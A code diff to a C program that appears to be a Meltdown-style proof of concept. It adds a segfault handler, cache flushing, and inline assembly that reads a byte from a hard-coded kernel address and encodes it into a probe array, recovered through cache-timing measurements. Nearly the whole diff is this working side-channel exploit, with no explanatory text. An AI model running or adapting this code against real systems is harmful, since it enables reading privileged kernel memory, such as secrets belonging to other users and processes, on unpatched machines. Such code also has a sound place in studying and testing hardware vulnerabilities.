@@ -4,8 +4,15 @@
 #include <setjmp.h>
 
 #define PAGE_SIZE (4096)
-#define CYCLES_CACHE_HIT 150
+#define CYCLES_CACHE_HIT 100
 #define WANTED_VALUE 40
+
+static jmp_buf context;
+
+void segfault_handler() {
+	// puts("received SIGSEGV");
+	longjmp(context, 1);
+}
 
 int main() {
 
@@ -18,17 +25,32 @@ int main() {
 	int i_min = -1;
 	unsigned char dummy;
 
+	// setup segfault handling
+	struct sigaction segfault_act;
+	segfault_act.sa_handler = segfault_handler;
+	sigaction(SIGSEGV, &segfault_act, NULL);
+
 	for(i=1; i<=256; i++)
 		array[PAGE_SIZE*i] = i;
 
-    while(cycles_min > CYCLES_CACHE_HIT) {
+    // while(cycles_min > CYCLES_CACHE_HIT) {
         for(i=1; i<=256; i++)
             _mm_clflush(&array[PAGE_SIZE*i]);
 
-        // asm volatile ("cpuid\n\t" ::: "%rax", "%rbx", "%rcx", "%rdx");
+        if(setjmp(context))
+            goto end;
 
-        dummy = array[PAGE_SIZE*WANTED_VALUE];
-        printf("dummy %d\n", (unsigned int) dummy);
+        // FIXME: asm volatile ("" : : "b"(array+PAGE_SIZE));
+        asm volatile ("" : : "b"(array));
+        asm volatile ("movq $0xffffffff844001a0, %rcx");
+        asm volatile ("xorq %rax, %rax");
+        asm volatile ("movb (%rcx), %al");
+        asm volatile ("shlq $0xc, %rax");
+        asm volatile ("movq (%rbx,%rax), %rbx");
+
+end:
+        // dummy = array[PAGE_SIZE*WANTED_VALUE];
+        // printf("dummy %d\n", (unsigned int) dummy);
 
         for(i=1; i<=256; i++) {
             // https://stackoverflow.com/a/14214220/2057521
@@ -59,10 +81,10 @@ int main() {
             }
 
         }
-    }
+    // }
 
     printf("min cycles %3d: %lu\n", i_min, cycles_min);
-    printf("dummy %d\n", (unsigned int) dummy);
+    // printf("dummy %d\n", (unsigned int) dummy);
 
     return 0;
 }
